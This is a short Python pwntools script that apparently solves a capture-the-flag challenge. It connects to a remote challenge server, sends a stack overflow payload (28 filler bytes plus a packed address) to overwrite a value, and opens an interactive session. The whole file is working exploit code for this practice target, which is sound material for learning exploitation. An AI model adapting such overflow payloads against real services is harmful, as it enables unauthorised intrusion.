from pwn import *
 
ip = "bamboofox.cs.nctu.edu.tw"
port = 58799
r = remote(ip,port)

context.arch = 'amd64'

con = 0x1a0a
payload = "a"*28 + p64(con)

print('payload = '+payload)
r.recvuntil(':')
r.sendline(payload)
r.interactive()
